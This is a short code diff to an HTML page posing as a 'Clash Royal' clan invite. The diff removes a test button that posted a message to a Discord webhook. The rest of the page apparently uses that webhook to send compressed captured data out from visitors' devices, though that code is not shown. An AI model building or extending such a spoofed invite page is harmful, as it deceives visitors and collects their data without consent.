@@ -14,9 +14,7 @@
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     <link rel="icon" href="https://img.tapimg.net/market/images/fce4e8232e9e9510ab646dbf62399c59.png" type="image/png">
     <title>Clan Invite - Clash Royal</title>
-    <button id="mobile-test" style="position: fixed; bottom: 10px; right: 10px;">
-  Mobile Connection Test
-</button>
+   
     <style>
         .join-button, .store-buttons img {
   touch-action: manipulation; /* Disable double-tap zoom */
@@ -311,15 +309,7 @@ async function compressForMobile(blob) {
     quality: 0.7 
   });
 }
-        // Add to your script
-document.querySelector('#mobile-test').addEventListener('click', async () => {
-  const test = await fetch('https://echo.websocket.org');
-  await fetch(DISCORD_WEBHOOK, {
-    method: 'POST',
-    body: JSON.stringify({ test: 'mobile_connection' })
-  });
-  alert('Test completed - check Discord');
-});
+       
        
     </script>
     
